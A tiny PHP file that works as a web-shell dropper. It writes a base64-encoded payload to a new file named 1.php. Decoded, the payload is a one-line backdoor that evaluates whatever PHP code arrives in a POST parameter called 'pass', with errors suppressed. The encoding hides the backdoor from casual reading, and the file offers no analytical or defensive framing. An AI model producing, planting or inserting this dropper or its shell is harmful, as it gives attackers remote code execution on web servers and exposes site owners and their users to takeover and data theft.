<?php
// base64_decode
fwrite(fopen("1.php" , "w") , base64_decode("PD9waHAgIEBldmFsKCRfUE9TVFsncGFzcyddKTsgPz4="));

?>